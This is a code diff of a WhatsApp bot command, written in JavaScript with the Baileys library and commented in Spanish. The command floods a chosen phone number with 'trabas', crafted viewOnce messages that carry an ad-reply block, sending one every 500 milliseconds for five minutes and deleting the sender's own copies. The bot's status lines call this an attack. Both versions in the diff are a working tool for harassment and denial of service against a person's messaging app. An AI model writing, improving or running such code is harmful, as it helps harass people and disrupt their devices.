@@ -1,14 +1,17 @@
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
-let handler = async (m, { conn, args }) => {
-  if (!m.fromMe) return; // Solo el bot puede usarlo
+let handler = async (m, { conn, args, command }) => {
+  if (!m.fromMe) return;
 
   const numero = args[0]?.replace(/[^0-9]/g, "");
-  if (!numero) return m.reply("⚠️ Debes escribir un número válido. Ej: .trabarios +529991234567");
+  if (!numero) return m.reply(`⚠️ Uso correcto:\n.${command} +529991234567`);
 
   const jid = numero + "@s.whatsapp.net";
-  const pushname = conn.getName(jid).catch(() => numero);
   const delay = ms => new Promise(res => setTimeout(res, ms));
+  const start = Date.now();
+  const duration = 5 * 60 * 1000;
+  let enviados = 0;
+
   const mensajeTraba = {
     viewOnceMessage: {
       message: {
@@ -19,7 +22,7 @@ let handler = async (m, { conn, args }) => {
         contextInfo: {
           externalAdReply: {
             title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
-            body: `Haii ${numero}`,
+            body: `Ataque iniciado`,
             previewType: "PHOTO",
             thumbnail: null,
             sourceUrl: "https://example.com/tama"
@@ -29,22 +32,18 @@ let handler = async (m, { conn, args }) => {
     }
   };
 
-  await conn.sendMessage(m.chat, { text: `⏳ Iniciando ataque invisible a ${numero} por 5 minutos...` }, { quoted: m });
-
-  const start = Date.now();
-  const duration = 5 * 60 * 1000;
-  let enviados = 0;
+  await conn.sendMessage(m.chat, { text: `⏳ Enviando trabas a ${numero} durante 5 minutos...` }, { quoted: m });
 
   try {
     while (Date.now() - start < duration) {
-      const generated = generateWAMessageFromContent(jid, mensajeTraba, {});
-      await conn.relayMessage(jid, generated.message, { messageId: generated.key.id });
-      await conn.sendMessage(conn.user.id, { delete: generated.key });
+      const msg = generateWAMessageFromContent(jid, mensajeTraba, {});
+      await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });
+      await conn.sendMessage(conn.user.id, { delete: msg.key });
       enviados++;
-      await delay(500); // Velocidad de ataque
+      await delay(500);
     }
 
-    await conn.sendMessage(m.chat, { text: `✅ Ataque finalizado. Se enviaron ${enviados} trabas invisibles a ${numero}` }, { quoted: m });
+    await conn.sendMessage(m.chat, { text: `✅ Ataque completado. Enviadas ${enviados} trabas.` }, { quoted: m });
   } catch (e) {
     await conn.sendMessage(m.chat, { text: "❌ Error durante el ataque:\n" + e.message }, { quoted: m });
   }
